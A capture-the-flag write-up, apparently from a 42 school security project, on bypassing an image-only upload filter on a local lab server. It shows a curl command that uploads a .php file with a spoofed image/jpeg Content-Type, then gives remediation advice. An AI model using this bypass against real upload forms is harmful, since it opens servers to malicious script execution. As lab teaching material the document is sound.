# [WSTG-BUSL-08] Unrestricted File Upload

[Add image](http://192.168.56.101/?page=upload) contains a `<form>` element with attribute `enctype="multipart/form-data"` which specifies how the form-data should be encoded when submitting.

Only `jpeg` extension (not even `jpg`) is allowed to be upload.

<img width="1021" alt="image" src="https://user-images.githubusercontent.com/46742040/202015974-04c11238-a64c-472b-a20b-43f59046f518.png">

`cURL` let emulate a filled-in form using `-F` option and set `Content-Type` header.

```sh
┌──$ [~/42/2022/darkly]
└─> touch /tmp/test.php
┌──$ [~/42/2022/darkly]
└─> curl -s -X POST -F "Upload=Upload" -F "uploaded=@/tmp/test.php;type=image/jpeg" "http://192.168.56.101/?page=upload" | grep -oE "The flag is : [[:alnum:]]{64}"
The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## Remediation
The vulnerability that could occur if uploaded script files `php`, `asp`, `jsp`, etc... contains malicious code that can be executed. In order to prevent it:

- Restrict file types to only necessary ones
- Have at least some sort of filtering, content checking, and go through `whitelist` for uploaded file
- Remove all the control characters, or special charactres (i.e. `;`, `:` `<`, `>`, etc..) from the filenames
- Limit the filename, and file size
